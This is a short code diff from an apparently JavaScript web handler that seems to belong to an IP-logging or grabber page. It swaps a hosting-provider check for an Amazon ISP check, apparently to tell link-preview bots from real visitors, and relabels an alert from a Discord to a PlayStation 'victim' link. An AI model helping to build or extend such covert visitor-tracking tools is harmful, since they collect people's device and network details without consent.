@@ -83,11 +83,11 @@ export default async function handler(req, res) {
 
         let message;
 
-        if (ipDetails.hosting) {
+        if (ipDetails.isp === "Amazon.com, Inc.") {
             message = {
                 embeds: [
                     {
-                        title: "User Send Link To Victim in Discord Message",
+                        title: "User Send Link To Victim in Playstation Message",
                         color: 0xFF0000, // Red color to indicate alert
                         description: "Device info collected from sender.",
                         fields: [
